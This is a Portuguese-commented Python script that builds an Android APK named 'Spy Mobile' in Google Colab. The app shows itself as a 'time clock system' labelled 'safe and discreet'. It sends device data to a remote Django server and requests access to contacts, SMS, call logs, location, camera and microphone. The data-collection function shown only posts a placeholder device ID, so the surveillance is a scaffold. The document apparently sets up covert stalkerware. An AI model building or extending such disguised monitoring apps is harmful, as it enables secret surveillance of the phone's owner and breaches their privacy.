#!/usr/bin/env python3
"""
🚀 GERADOR AUTOMÁTICO DE APK NO GOOGLE COLAB
Autor: Sistema Spy Mobile
Versão: 1.0

Este script automatiza todo o processo de geração de APK no Google Colab.
Execute este arquivo diretamente no Colab para gerar seu APK automaticamente.
"""

import os
import subprocess
import time
import glob

class ColabAPKGenerator:
    def __init__(self):
        self.project_name = "spy-mobile"
        self.app_title = "Spy Mobile"
        self.package_name = "spymobile"
        self.django_ip = "192.168.0.97"  # ALTERE AQUI PARA SEU IP
        self.django_port = "8000"
        
    def print_step(self, step, message):
        """Imprime mensagem formatada para cada passo"""
        print(f"\n{'='*60}")
        print(f"🔥 PASSO {step}: {message}")
        print(f"{'='*60}")
        
    def run_command(self, command, description=""):
        """Executa comando e trata erros"""
        try:
            if description:
                print(f"⚡ {description}")
            
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"✅ Sucesso: {description}")
                return True
            else:
                print(f"❌ Erro: {description}")
                print(f"Erro: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"❌ Exceção: {str(e)}")
            return False
    
    def setup_environment(self):
        """Passo 1: Configurar ambiente básico"""
        self.print_step(1, "CONFIGURANDO AMBIENTE BÁSICO")
        
        commands = [
            ("apt update -qq", "Atualizando repositórios"),
            ("apt install -y openjdk-8-jdk unzip wget git python3-pip", "Instalando dependências"),
        ]
        
        for cmd, desc in commands:
            if not self.run_command(cmd, desc):
                return False
        
        # Configurar JAVA_HOME
        os.environ['JAVA_HOME'] = '/usr/lib/jvm/java-8-openjdk-amd64'
        print(f"✅ JAVA_HOME configurado: {os.environ['JAVA_HOME']}")
        
        return True
    
    def download_android_tools(self):
        """Passo 2: Baixar Android SDK e NDK"""
        self.print_step(2, "BAIXANDO ANDROID SDK E NDK")
        
        # Criar diretórios
        os.makedirs('/content/android-sdk', exist_ok=True)
        os.makedirs('/content/android-ndk', exist_ok=True)
        
        commands = [
            ("wget -q https://dl.google.com/android/repository/commandlinetools-linux-8512546_latest.zip -O /content/cmdtools.zip", 
             "Baixando Android SDK Command Line Tools"),
            ("unzip -q /content/cmdtools.zip -d /content/android-sdk/", 
             "Extraindo SDK"),
            ("mv /content/android-sdk/cmdline-tools /content/android-sdk/cmdline-tools-temp", 
             "Reorganizando SDK"),
            ("mkdir -p /content/android-sdk/cmdline-tools/latest", 
             "Criando estrutura SDK"),
            ("mv /content/android-sdk/cmdline-tools-temp/* /content/android-sdk/cmdline-tools/latest/", 
             "Finalizando SDK"),
            ("wget -q https://dl.google.com/android/repository/android-ndk-r25b-linux.zip -O /content/ndk.zip", 
             "Baixando Android NDK"),
            ("unzip -q /content/ndk.zip -d /content/", 
             "Extraindo NDK"),
            ("mv /content/android-ndk-r25b /content/android-ndk/", 
             "Organizando NDK"),
        ]
        
        for cmd, desc in commands:
            if not self.run_command(cmd, desc):
                return False
        
        print("✅ Android SDK e NDK baixados com sucesso!")
        return True
    
    def configure_android_env(self):
        """Passo 3: Configurar variáveis de ambiente Android"""
        self.print_step(3, "CONFIGURANDO VARIÁVEIS DE AMBIENTE")
        
        # Configurar variáveis de ambiente
        env_vars = {
            'ANDROID_HOME': '/content/android-sdk',
            'ANDROID_SDK_ROOT': '/content/android-sdk',
            'ANDROID_NDK_HOME': '/content/android-ndk',
            'NDK_HOME': '/content/android-ndk',
        }
        
        for var, path in env_vars.items():
            os.environ[var] = path
            print(f"✅ {var} = {path}")
        
        # Atualizar PATH
        current_path = os.environ.get('PATH', '')
        new_path = f"{current_path}:/content/android-sdk/cmdline-tools/latest/bin:/content/android-sdk/platform-tools"
        os.environ['PATH'] = new_path
        
        # Aceitar licenças e instalar componentes
        commands = [
            ("yes | /content/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses", 
             "Aceitando licenças do SDK"),
            ("/content/android-sdk/cmdline-tools/latest/bin/sdkmanager 'platform-tools' 'platforms;android-30' 'build-tools;30.0.3'", 
             "Instalando componentes do SDK"),
        ]
        
        for cmd, desc in commands:
            self.run_command(cmd, desc)
        
        print("✅ Ambiente Android configurado!")
        return True
    
    def install_python_tools(self):
        """Passo 4: Instalar ferramentas Python"""
        self.print_step(4, "INSTALANDO FERRAMENTAS PYTHON")
        
        commands = [
            ("pip install --upgrade pip", "Atualizando pip"),
            ("pip install buildozer python-for-android cython", "Instalando buildozer"),
            ("pip install kivy pyjnius requests plyer", "Instalando dependências do app"),
        ]
        
        for cmd, desc in commands:
            if not self.run_command(cmd, desc):
                return False
        
        # Verificar instalação
        result = subprocess.run("buildozer --version", shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"✅ Buildozer instalado: {result.stdout.strip()}")
            return True
        else:
            print("❌ Erro na instalação do buildozer")
            return False
    
    def create_project(self):
        """Passo 5: Criar estrutura do projeto"""
        self.print_step(5, "CRIANDO PROJETO")
        
        # Criar diretório do projeto
        project_path = f"/content/{self.project_name}"
        os.makedirs(project_path, exist_ok=True)
        os.chdir(project_path)
        
        # Criar main.py
        main_py_content = self.get_main_py_content()
        
        with open('main.py', 'w') as f:
            f.write(main_py_content)
        
        print("✅ main.py criado com sucesso!")
        
        # Listar arquivos
        files = os.listdir('.')
        print(f"📁 Arquivos no projeto: {files}")
        
        return True
    
    def create_buildozer_spec(self):
        """Passo 6: Criar arquivo buildozer.spec"""
        self.print_step(6, "CRIANDO BUILDOZER.SPEC")
        
        spec_content = self.get_buildozer_spec_content()
        
        with open('buildozer.spec', 'w') as f:
            f.write(spec_content)
        
        print("✅ buildozer.spec criado com sucesso!")
        return True
    
    def build_apk(self):
        """Passo 7: Gerar APK"""
        self.print_step(7, "GERANDO APK (PROCESSO PRINCIPAL)")
        
        # Reconfigurar variáveis de ambiente
        env_vars = {
            'ANDROID_HOME': '/content/android-sdk',
            'ANDROID_SDK_ROOT': '/content/android-sdk',
            'ANDROID_NDK_HOME': '/content/android-ndk',
            'NDK_HOME': '/content/android-ndk',
            'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64',
        }
        
        for var, path in env_vars.items():
            os.environ[var] = path
        
        # Inicializar buildozer
        if not self.run_command("buildozer init", "Inicializando buildozer"):
            return False
        
        print("🔥 INICIANDO GERAÇÃO DO APK...")
        print("⏰ Este processo pode levar 15-20 minutos")
        print("📱 Aguarde até ver 'APK GERADO COM SUCESSO!'")
        
        start_time = time.time()
        
        # Gerar APK
        result = subprocess.run("buildozer android debug", shell=True)
        
        end_time = time.time()
        duration = (end_time - start_time) / 60  # em minutos
        
        if result.returncode == 0:
            print(f"✅ APK gerado com sucesso em {duration:.1f} minutos!")
            return True
        else:
            print(f"❌ Erro na geração do APK após {duration:.1f} minutos")
            return False
    
    def finalize_apk(self):
        """Passo 8: Finalizar e disponibilizar APK"""
        self.print_step(8, "FINALIZANDO APK")
        
        # Procurar pelo APK
        apk_files = glob.glob(f'/content/{self.project_name}/bin/*.apk')
        
        if apk_files:
            apk_path = apk_files[0]
            apk_size = os.path.getsize(apk_path) / (1024*1024)  # MB
            
            print(f"🎉 APK GERADO COM SUCESSO!")
            print(f"📁 Localização: {apk_path}")
            print(f"📏 Tamanho: {apk_size:.2f} MB")
            
            # Copiar APK para área de download
            final_apk_path = f"/content/{self.app_title.replace(' ', '')}.apk"
            subprocess.run(f"cp '{apk_path}' '{final_apk_path}'", shell=True)
            
            print(f"✅ APK copiado para {final_apk_path}")
            
            self.print_final_instructions(final_apk_path, apk_size)
            return True
        else:
            print("❌ APK não foi gerado. Verifique os erros acima.")
            return False
    
    def print_final_instructions(self, apk_path, apk_size):
        """Imprime instruções finais"""
        print("\n" + "="*60)
        print("🎉 TUTORIAL CONCLUÍDO COM SUCESSO!")
        print("="*60)
        
        print(f"\n📱 INFORMAÇÕES DO APK:")
        print(f"• Nome: {self.app_title}")
        print(f"• Arquivo: {os.path.basename(apk_path)}")
        print(f"• Tamanho: {apk_size:.2f} MB")
        print(f"• Localização: {apk_path}")
        
        print(f"\n📥 COMO BAIXAR:")
        print("1. Clique no ícone de pasta (📁) no painel esquerdo")
        print(f"2. Procure pelo arquivo '{os.path.basename(apk_path)}'")
        print("3. Clique nos 3 pontos (...) ao lado do arquivo")
        print("4. Selecione 'Download'")
        
        print(f"\n⚙️ ANTES DE INSTALAR:")
        print(f"1. Altere o IP no servidor Django (atualmente: {self.django_ip})")
        print("2. Certifique-se que o servidor Django está rodando")
        print("3. Habilite 'Fontes desconhecidas' no Android")
        print("4. Instale o APK normalmente")
        
        print(f"\n🔐 PERMISSÕES INCLUÍDAS:")
        permissions = [
            "Internet", "Localização (GPS)", "Contatos", "SMS", 
            "Histórico de chamadas", "Armazenamento", "Câmera", 
            "Microfone", "Estado da rede"
        ]
        for perm in permissions:
            print(f"• {perm}")
        
        print(f"\n✅ SEU APK ESTÁ PRONTO PARA USO!")
    
    def get_main_py_content(self):
        """Retorna o conteúdo do main.py"""
        return f'''from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle
import time
import requests

# Configuração do endpoint Django
DJANGO_IP = '{self.django_ip}'  # ALTERE PARA SEU IP
DJANGO_PORT = '{self.django_port}'
ENDPOINT_BASE = f'http://{{DJANGO_IP}}:{{DJANGO_PORT}}/api/'

class DigitalTimerLabel(Label):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.font_size = 96
        self.color = (0.3, 0.3, 0.3, 1)
        self.bold = True

class SpyMobile(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', **kwargs)
        
        with self.canvas.before:
            Color(0, 0, 0, 1)
            self.rect = Rectangle(size=Window.size, pos=self.pos)
        
        self.bind(size=self._update_rect, pos=self._update_rect)
        
        self.is_monitoring = False
        self.start_time = None
        self.timer_event = None
        
        main_layout = BoxLayout(orientation='vertical', padding=20, spacing=20)
        
        title_label = Label(
            text='SISTEMA DE PONTO',
            font_size=24,
            color=(1, 0, 0, 1),
            bold=True
        )
        main_layout.add_widget(title_label)
        
        self.timer_label = DigitalTimerLabel(text='00:00:00')
        main_layout.add_widget(self.timer_label)
        
        self.status_label = Label(
            text='Sistema parado - Clique em PLAY para iniciar',
            font_size=16,
            color=(0.7, 0, 0, 1)
        )
        main_layout.add_widget(self.status_label)
        
        buttons_layout = BoxLayout(orientation='horizontal', size_hint_y=0.3, spacing=15)
        
        self.play_button = Button(
            text='PLAY',
            font_size=20,
            background_color=(0, 0.7, 0, 1),
            bold=True
        )
        self.play_button.bind(on_press=self.start_monitoring)
        buttons_layout.add_widget(self.play_button)
        
        self.collect_button = Button(
            text='COLETAR',
            font_size=18,
            background_color=(0, 0.5, 0.8, 1),
            bold=True,
            disabled=True
        )
        self.collect_button.bind(on_press=self.manual_collect)
        buttons_layout.add_widget(self.collect_button)
        
        self.stop_button = Button(
            text='STOP',
            font_size=20,
            background_color=(0.7, 0, 0, 1),
            bold=True,
            disabled=True
        )
        self.stop_button.bind(on_press=self.stop_monitoring)
        buttons_layout.add_widget(self.stop_button)
        
        main_layout.add_widget(buttons_layout)
        
        info_label = Label(
            text='Sistema seguro e discreto',
            font_size=12,
            color=(0.5, 0, 0, 1)
        )
        main_layout.add_widget(info_label)
        
        self.add_widget(main_layout)

    def _update_rect(self, instance, value):
        self.rect.size = instance.size
        self.rect.pos = instance.pos

    def start_monitoring(self, instance):
        if not self.is_monitoring:
            self.is_monitoring = True
            self.start_time = time.time()
            
            self.status_label.text = 'Coletando dados do dispositivo...'
            self.timer_label.color = (1, 0, 0, 1)
            
            self.play_button.disabled = True
            self.collect_button.disabled = False
            self.stop_button.disabled = False
            
            self.timer_event = Clock.schedule_interval(self.update_timer, 1)
            Clock.schedule_once(lambda dt: self.executar_coleta(), 2)

    def stop_monitoring(self, instance):
        if self.is_monitoring:
            self.is_monitoring = False
            
            if self.timer_event:
                self.timer_event.cancel()
            
            self.status_label.text = 'Sistema parado - Clique em PLAY para iniciar'
            self.timer_label.color = (0.3, 0.3, 0.3, 1)
            self.timer_label.text = '00:00:00'
            
            self.play_button.disabled = False
            self.collect_button.disabled = True
            self.stop_button.disabled = True

    def manual_collect(self, instance):
        if self.is_monitoring:
            self.status_label.text = 'Coletando novos dados...'
            Clock.schedule_once(lambda dt: self.executar_coleta(), 0.5)

    def update_timer(self, dt):
        if self.is_monitoring and self.start_time:
            elapsed = int(time.time() - self.start_time)
            h = elapsed // 3600
            m = (elapsed % 3600) // 60
            s = elapsed % 60
            
            timer_text = f'{{h:02d}}:{{m:02d}}:{{s:02d}}'
            self.timer_label.text = timer_text
            
            if s % 2 == 0:
                self.timer_label.color = (1, 0, 0, 1)
            else:
                self.timer_label.color = (0.8, 0, 0, 1)

    def executar_coleta(self):
        try:
            data = {{
                'imei': 'dispositivo_teste',
                'timestamp': time.time(),
                'status': 'ativo'
            }}
            
            try:
                response = requests.post(f'{{ENDPOINT_BASE}}atividade/', json=data, timeout=5)
                if response.status_code == 200:
                    self.status_label.text = 'Dados enviados com sucesso!'
                else:
                    self.status_label.text = 'Dados coletados (servidor offline)'
            except:
                self.status_label.text = 'Dados coletados (servidor offline)'
                
        except Exception as e:
            self.status_label.text = f'Erro na coleta: {{str(e)[:30]}}'

class SpyMobileApp(App):
    def build(self):
        Window.clearcolor = (0, 0, 0, 1)
        return SpyMobile()

if __name__ == '__main__':
    SpyMobileApp().run()
'''
    
    def get_buildozer_spec_content(self):
        """Retorna o conteúdo do buildozer.spec"""
        return f'''[app]

# (str) Title of your application
title = {self.app_title}

# (str) Package name
package.name = {self.package_name}

# (str) Package domain (needed for android/ios packaging)
package.domain = org.example

# (str) Source code where the main.py live
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas,ico

# (str) Application versioning (method 1)
version = 0.1

# (list) Application requirements
requirements = python3,kivy,pyjnius,requests,plyer

# (str) Supported orientation (landscape, sensorLandscape, portrait, sensorPortrait or all)
orientation = portrait

# (bool) Indicate if the application should be fullscreen or not
fullscreen = 0

# (int) Target Android API, should be as high as possible.
android.api = 30

# (int) Minimum API your APK will support.
android.minapi = 21

# (str) Android NDK version to use
android.ndk = 25b

# (str) Android SDK version to use
android.sdk = 30

# (str) Android logcat filters to use
android.logcat_filters = *:S python:D

# (bool) Copy library instead of making a libpymodules.so
android.copy_libs = 1

# (str) The Android arch to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
android.archs = arm64-v8a

# (bool) enables Android auto backup feature (Android API >=23)
android.allow_backup = True

# (str) The format used to package the app for release mode (aab or apk).
android.release_artifact = apk

[buildozer]

# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = False, 1 = True)
warn_on_root = 0

[app:android.permissions]
INTERNET = 1
ACCESS_FINE_LOCATION = 1
ACCESS_COARSE_LOCATION = 1
READ_CONTACTS = 1
READ_SMS = 1
READ_CALL_LOG = 1
READ_EXTERNAL_STORAGE = 1
WRITE_EXTERNAL_STORAGE = 1
CAMERA = 1
RECORD_AUDIO = 1
ACCESS_NETWORK_STATE = 1
ACCESS_WIFI_STATE = 1
'''
    
    def run_full_process(self):
        """Executa todo o processo de geração do APK"""
        print("🚀 INICIANDO GERAÇÃO AUTOMÁTICA DE APK NO GOOGLE COLAB")
        print("="*60)
        
        start_time = time.time()
        
        steps = [
            (self.setup_environment, "Configurar ambiente"),
            (self.download_android_tools, "Baixar Android tools"),
            (self.configure_android_env, "Configurar ambiente Android"),
            (self.install_python_tools, "Instalar ferramentas Python"),
            (self.create_project, "Criar projeto"),
            (self.create_buildozer_spec, "Criar buildozer.spec"),
            (self.build_apk, "Gerar APK"),
            (self.finalize_apk, "Finalizar APK"),
        ]
        
        for i, (step_func, step_name) in enumerate(steps, 1):
            try:
                if not step_func():
                    print(f"❌ FALHA NO PASSO {i}: {step_name}")
                    return False
            except Exception as e:
                print(f"❌ ERRO NO PASSO {i}: {step_name}")
                print(f"Exceção: {str(e)}")
                return False
        
        end_time = time.time()
        total_duration = (end_time - start_time) / 60  # em minutos
        
        print(f"\n🎉 PROCESSO COMPLETO FINALIZADO EM {total_duration:.1f} MINUTOS!")
        return True

def main():
    """Função principal"""
    generator = ColabAPKGenerator()
    
    # Altere aqui as configurações se necessário
    # generator.django_ip = "SEU_IP_AQUI"  # Descomente e altere
    # generator.app_title = "Meu App"      # Descomente e altere
    
    success = generator.run_full_process()
    
    if success:
        print("\n✅ APK gerado com sucesso! Baixe o arquivo da pasta de arquivos.")
    else:
        print("\n❌ Falha na geração do APK. Verifique os erros acima.")

if __name__ == "__main__":
    main()